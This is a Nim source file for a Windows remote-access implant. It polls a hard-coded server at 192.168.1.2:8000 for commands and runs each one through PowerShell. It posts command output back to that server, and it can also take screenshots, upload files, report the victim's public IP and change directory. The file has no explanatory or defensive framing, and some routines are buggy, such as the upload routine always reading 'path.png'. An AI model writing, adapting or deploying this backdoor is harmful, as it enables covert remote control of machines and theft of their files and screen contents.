import std/[httpclient,json,base64]
import os,strutils,osproc,winim


var url="http://192.168.1.2:8000/"



proc GetCommand(client:HttpClient):string = 
    # var client = newHttpClient()
    try:
        var loc=os.getCurrentDir()
        return client.getContent(url&"command?q="&encode(loc))
    finally:
        client.close()

proc PostRes(client:HttpClient,res:string) =
    client.headers = newHttpHeaders({ "Content-Type": "application/json" })
    let body = %*{
        "data": res
    }
    try:
        let response = client.request(url&"res", httpMethod = HttpPost, body = $body)
    finally:
        client.close()

proc takeScreenshot(): void =
    var code="Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$bitmap = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);$graphics = [System.Drawing.Graphics]::FromImage($bitmap);$graphics.CopyFromScreen([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.X, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Y, 0, 0, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Size);$bitmap.Save({path.png});$graphics.Dispose();$bitmap.Dispose();"
    var res=execCmdEX("Powershell "&code)

proc postFile(client:HttpClient,name: string) =
  let data = readFile("path.png")
  client.headers = newHttpHeaders({"Content-Type": "application/json" })
  
  var body =data

  try:
    let response = client.request(url & "file/"&name, httpMethod = HttpPost, body = body)

  finally:
    client.close()

proc ExecuteCommand(commad:string) : string=
    var result = execCmdEx("Powershell "&commad, options = {},)
    return result.output

proc getPublicIPAddress(client:HttpClient): string =
    let response = client.get("https://api.ipify.org")
    return response.body.strip()

proc main() =
    # var ip=getPublicIPAddress()
    var client = newHttpClient()
    while true:
        var command=GetCommand(client)
        if command.len==0:
            sleep(3000)
            continue
        else:
            if command=="screenshot":
                takeScreenshot()
                postFile(client,"path.png")
            elif command.contains("cd"):
                var part=command.split(" ")
                os.setCurrentDir(part[1])
            elif command.contains("ip"):
                var ip=getPublicIPAddress(client)
                PostRes(client,ip)
            elif command.contains("sendfile"):
                var part=command.split(" ")
                postFile(client,part[1])
            elif command.contains("exit"):
                return
            else:
                var comm_res=ExecuteCommand(command)
                PostRes(client,comm_res)
main()
